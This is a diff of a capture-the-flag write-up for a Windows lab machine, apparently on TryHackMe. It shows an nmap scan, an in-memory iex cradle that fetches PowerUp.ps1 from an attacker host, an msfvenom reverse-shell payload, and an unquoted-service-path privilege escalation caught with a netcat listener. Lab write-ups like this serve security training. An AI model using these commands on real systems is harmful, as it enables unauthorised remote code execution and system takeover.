@@ -32,7 +32,9 @@ For machine enumeration, we will scan all ports of the machine, request it to re
 -	-Pn: Ignores checking whether the remote host is active and online.
 -	-n: Disables DNS name resolution for IP addresses.
 
-```sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -n -Pn 10.10.178.153 -oG allPorts```
+```
+sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -n -Pn 10.10.178.153 -oG allPorts
+```
 
 ![1]
 
@@ -79,11 +81,15 @@ The GitHub repository to download the tool is:[Github](https://github.com/PowerS
 
 We executed the script from our local machine using the Invoke-Expression tool, which means that the script was not downloaded or stored on the victim's machine.
 
-```iex(New-Object Net.WebClient).downloadString('http://LIP:LPORT/PowerUp.ps1')```
+```
+iex(New-Object Net.WebClient).downloadString('http://LIP:LPORT/PowerUp.ps1')
+```
 
 We need to launch an HTTP server using Python, specifying the directory where the file mentioned above is located as the document root.
 
-```sudo python3 -m http.server 8080```
+```
+sudo python3 -m http.server 8080
+```
 
 ![9]
 
@@ -102,25 +108,34 @@ To exploit this vulnerability, an attacker could create a malicious file with a 
 
 To take advantage of the vulnerability on this machine, we will go to the path:
 
-```C:\Program Files (x86)\IObit\```
+```
+C:\Program Files (x86)\IObit\
+```
 
 This path is the first path where we can add an executable file due to user permissions.
 
 Since we cannot access the C:\Program Files(x86) directory with our account privileges, we will place a vulnerable executable file named "Advanced.exe" generated with MSFVenom in this directory.
 
-```msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxx -f exe -o Advanced.exe```
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxx -f exe -o Advanced.exe
+```
 
 We will use the Invoke-WebRequest tool from the target machine to request the file by sharing it from our machine to the target machine through the Python server.
 
-```iwr -uri "http://AtackerIP:AtackerPort/Advanced.exe" -outfile "Advanced.exe```
+```
+iwr -uri "http://AtackerIP:AtackerPort/Advanced.exe" -outfile "Advanced.exe
+```
 
 ![11]
 
 Finally, we just need to stop and restart the service. When the service runs again, it will execute our script before the legitimate one, and it will call a listener that we have set up on our attacker machine as an administrator.
 
 ```
+Victim Machine:
 stop-service AdvancedSystemCareService9
 start-service AdvancedSystemCareService9
+
+Atacket Machine:
 nc -lvnp AtackerPort
 ```
  
